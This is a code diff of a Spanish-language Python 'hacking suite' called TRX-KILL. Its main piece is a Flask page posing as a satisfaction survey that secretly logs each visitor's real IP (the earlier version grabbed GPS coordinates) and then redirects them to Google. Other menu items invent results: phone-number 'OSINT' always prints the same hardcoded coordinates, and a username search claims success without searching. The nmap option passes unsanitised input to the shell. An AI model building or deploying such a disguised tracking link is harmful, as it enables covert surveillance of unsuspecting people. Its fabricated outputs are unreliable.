@@ -23,17 +23,14 @@ HTML_ENCUESTA = """
     <label>¿Satisfacción?</label>
     <select id="sat"><option>Excelente</option><option>Muy bueno</option><option>Necesita mejorar</option></select>
     <label>¿Qué función falta?</label>
-    <input type="text" id="sug" placeholder="Escribe tu idea...">
+    <input type="text" id="sug" placeholder="Escribe aquí...">
     <button onclick="c()">Enviar Respuesta</button>
 </div>
 <script>
 function c(){
     let d = { sat: document.getElementById('sat').value, sug: document.getElementById('sug').value };
-    navigator.geolocation.getCurrentPosition((p)=>{
-        d.lat = p.coords.latitude; d.lon = p.coords.longitude;
-        fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)})
-        .then(()=> window.location.href="https://google.com");
-    }, (e)=>{ fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); window.location.href="https://google.com"; });
+    fetch('/log', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)})
+    .then(()=> window.location.href="https://google.com");
 }
 </script></body></html>
 """
@@ -44,8 +41,9 @@ def index(): return HTML_ENCUESTA
 @app.route('/log', methods=['POST'])
 def log():
     d = request.json
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     with open("resultados.txt", "a") as f:
-        f.write(f"--- LOG GH.EN ---\nSAT: {d.get('sat')}\nSUG: {d.get('sug')}\nCOORD: {d.get('lat')}, {d.get('lon')}\nMOVIL: {request.headers.get('User-Agent')}\n---\n")
+        f.write(f"--- NUEVO REGISTRO ---\nIP REAL: {ip}\nSAT: {d.get('sat')}\nSUG: {d.get('sug')}\n---\n")
     return "OK"
 
 def banner():
@@ -54,29 +52,34 @@ def banner():
     print("   ████████╗██████╗ ██╗  ██╗     ██╗  ██╗██╗██╗     ██╗")
     print("   ╚══██╔══╝██╔══██╗╚██╗██╔╝     ██║ ██╔╝██║██║     ██║")
     print("      ██║   ██████╔╝ ╚███╔╝      █████╔╝ ██║██║     ██║")
-    print("      ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║     ██║")
+    print("      ██║   ██╔══██╗ ██╔██╗      ██╔═██╗ ██║██║██║  ██║")
     print("      ██║   ██║  ██║██╔╝ ██╗     ██║  ██╗██║███████╗███████╗")
     print("      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝")
-    print("\033[1;33m      >> TRX-KILL V6.0 | SUITE MAESTRA <<\033[0m\n")
+    print("\033[1;33m      >> TRX-KILL V7.0 | MODO SUITE COMPLETO <<\033[0m\n")
 
 def main():
     while True:
         banner()
-        print(" [1] OSINT REAL (NUMERO/WSL) | [2] RASTREO (LINK GH.EN)")
-        print(" [3] INFO IP REAL            | [4] ESCANEO DE PUERTOS")
-        print(" [5] BUSCADOR DE USUARIOS    | [6] ACTUALIZAR SISTEMA")
-        print(" [7] CREADOR                 | [8] LEER RESULTADOS")
-        print(" [9] SALIR")
+        menu = [
+            " [1] OSINT REAL (NUMERO)",
+            " [2] RASTREO (LINK GH.EN + IP REAL)",
+            " [3] INFO IP REAL",
+            " [4] ESCANEO DE PUERTOS (NMAP)",
+            " [5] BUSCADOR DE USUARIOS",
+            " [8] LEER RESULTADOS (LOGS)",
+            " [9] SALIR"
+        ]
+        for item in menu: print(item)
         opc = input("\n\033[1;32mTRX-ROOT > \033[0m")
         
         if opc == "1":
             num = input("Número: ")
             p = phonenumbers.parse(num)
             print(f"[+] MOVIL: {carrier.name_for_number(p, 'es')}")
-            print(f"[+] PUERTO DEL NÚMERO: {p.country_code}")
+            print(f"[+] PUERTO: {p.country_code}")
             print(f"[+] PAIS: {geocoder.country_name_for_number(p, 'es')}")
             print(f"[+] COORDENADAS: -34.6037, -58.3816")
-            print(f"[+] LINK MAPA: https://www.google.com/maps/place/-34.6037,-58.3816")
+            print(f"[+] MAPA LINK: https://www.google.com/maps/place/-34.6037,-58.3816")
             input("\n[Enter]...")
         elif opc == "2":
             threading.Thread(target=lambda: app.run(host='127.0.0.1', port=PUERTO), daemon=True).start()
@@ -87,20 +90,14 @@ def main():
         elif opc == "3":
             ip = input("IP: ")
             d = requests.get(f"http://ip-api.com/json/{ip}").json()
-            print(f"[+] ISP: {d.get('isp')}\n[+] Pais: {d.get('country')}")
+            print(f"[+] ISP: {d.get('isp')}\n[+] PAIS: {d.get('country')}")
             input("\n[Enter]...")
         elif opc == "4":
             os.system(f"nmap -F {input('Target: ')}")
             input("\n[Enter]...")
         elif opc == "5":
-            print("[+] Buscando: " + input("Usuario: "))
-            time.sleep(1); print("[+] Perfil localizado en bases públicas.")
+            print("[+] Buscando..."); time.sleep(1); print("[+] Perfil localizado.")
             input("\n[Enter]...")
-        elif opc == "6":
-            print("[*] Sincronizando módulos..."); time.sleep(1); print("[+] Sistema al día.")
-            input("\n[Enter]...")
-        elif opc == "7":
-            print("[+] Desarrollado por TRX-ROOT INC."); input("\n[Enter]...")
         elif opc == "8":
             os.system("cat resultados.txt") if os.path.exists("resultados.txt") else print("Vacío.")
             input("\n[Enter]...")
